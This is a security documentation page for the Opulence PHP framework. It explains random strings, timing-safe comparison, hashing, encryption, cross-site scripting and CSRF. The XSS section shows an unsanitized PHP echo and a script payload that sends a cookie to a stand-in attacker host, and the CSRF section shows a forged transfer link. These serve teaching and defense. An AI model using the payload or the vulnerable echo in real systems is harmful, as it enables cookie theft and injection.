# Security

## Table of Contents
1. [Introduction](#introduction)
2. [Generating Random Strings](#generating-random-strings)
  1. [What is It?](#random-strings-what-is-it)
  2. [How to Use It](#random-strings-how-to-use-it)
3. [Comparing Strings](#comparing-strings)
  1. [What is It?](#comparing-strings-what-is-it)
  2. [How to Use It](#comparing-strings-how-to-use-it)
4. [Hashing](#hashing)
  1. [What is It?](#hashing-what-is-it)
  2. [How to Use It](#hashing-how-to-use-it)
5. [Encryption](#encryption)
  1. [What is It?](#encrpytion-what-is-it)
  2. [How to Use It](#encryption-how-to-use-it)
6. [Cross-Site Scripting (CSS)](#cross-site-scripting)
  1. [What is It?](#css-what-is-it)
  2. [How to Defend Against It](#css-how-to-defend-against-it)
7. [Cross-Site Request Forgery (CSRF/XSRF)](#cross-site-request-forgery)
  1. [What is It?](#csrf-what-is-it)
  2. [How to Defend Against It](#csrf-how-to-defend-against-it)

<h2 id="Introduction">Introduction</h2>
Building a secure application is extremely difficult.  Protecting your users from cross-site scripting, cross-site request forgeries, and session hijacking requires a lot of tools.  Fortunately, you don't have to be a security expert to take advantage of all the protection Opulence delivers out of the box.

<h2 id="generating-random-strings">Generating Random Strings</h2>
<h4 id="random-strings-what-is-it">What is It?</h4>
Random strings are commonly used to ensure security for things like session Ids and authentication tokens.  If your random strings are not so random, then your entire application can be compromised.

<h4 id="random-strings-how-to-use-it">How to Use It</h4>
Learn how to [generate random strings](cryptography#generating-random-strings) in Opulence.

<h2 id="comparing-strings">Comparing Strings</h2>
<h4 id="comparing-strings-what-is-it">What is It?</h4>
Comparing sensitive strings, like hashes and tokens, using PHP's `==` operator can give away information about the string you're comparing against.  For example, comparing "aaa" to "bbb" will return `false` faster than "aaa" and "aab" because PHP's comparison operator returns false at the first differing character.  Using 
a sensitive timer and many iterations, a hacker could figure out any secured hash that's being compared with user input.

<h4 id="comparing-strings-how-to-use-it">How to Use It</h4>
Learn how to [securely compare strings](cryptography#string-comparison) in Opulence.
   
<h2 id="hashing">Hashing</h2>
<h4 id="hashing-what-is-it">What is It?</h4>
Hashing involves performing a one-way mapping of input to a hashed value, which is suitable for storing sensitive data.  

<h4 id="hashing-how-to-use-it">How to Use It</h4>
Learn how to [hash data](cryptography#hashing) in Opulence.
   
<h2 id="encryption">Encryption</h2>
<h4 id="encryption-what-is-it">What is It?</h4>
Encryption is the process of encoding data with a special key so that only authorized parties may read it.  

<h4 id="encryption-how-to-use-it">How to Use It</h4>
Learn how to [encrypt data](cryptography#encryption) in Opulence.

<h2 id="cross-site-scripting">Cross-Site Scripting (CSS)</h2>
<h4 id="css-what-is-it">What is It?</h4>
Cross-site scripting involves the injection of client-side scripts into your pages.  A common vulnerability is displaying unsanitized user input to your page:

```php
Hello, <?php echo $_GET["name"]; ?>
```

A malicious user could send an unsuspecting user a hyperlink with a CSS injection in the URL:  `http://your-site.com/?name=<script>(new Image).src="http://attacker-site.com/" + $.cookie("user-password")</script>`.  Clicking on the link would take the user to your page, which would display:

```
Hello, <script>(new Image).src="http://attacker-site.com/" + $.cookie("user-password")</script>
```

Loading this page would send the user's "user-password" cookie to the attacker's server.

<h4 id="css-how-to-defend-against-it">How to Defend Against It</h4>
To solve this problem you must sanitize any user-input before displaying it on a page.  [Opulence's template system](view-basics#cross-site-scripting) gives you the tools to prevent cross-site scripting.

<h2 id="cross-site-request-forgery">Cross-Site Request Forgery (CSRF/XSRF)</h2>
<h4 id="csrf-what-is-it">What is It?</h4>
Cross-site request forgery is an attack where unauthorized commands are sent to a trusted site through an authenticated user.  For example, a malicious user might send a normal user Bob the following hyperlink:  `http://your-site.com/transferMoney?amount=1000&to=attacker-account-Id`.  If Bob was logged into your site, clicking this link would attempt to transfer money to the attacker's account without Bob's authorization.

<h4 id="csrf-how-to-defend-against-it">How to Defend Against It</h4>
To prevent this from happening, a unique token should be embedded in every form and with every session.  When the form is submitted, the form token and session token should be compared, and if they are not equal, the submission should be rejected.  In the example case above, the form token would not be set.  With CSRF protection in place, the form and session tokens would not match, and the form submission would be rejected.

Opulence automatically generates and compares the tokens using middleware.  To include the token in your form, use the `{{!csrfInput()!}}` template function in your view.  This will create a hidden input with your token, which will validate against the session token.  You can also use the `{{csrfToken()}}` template function to print the token in elements like meta tags:

```php
<meta name="csrf-token" content="{{csrfToken()}}">
```

To give you CSRF protection in JavaScript, Opulence sets the `XSRF-TOKEN` cookie, which some frameworks use to automatically set the `X-XSRF-TOKEN` HTTP header in requests.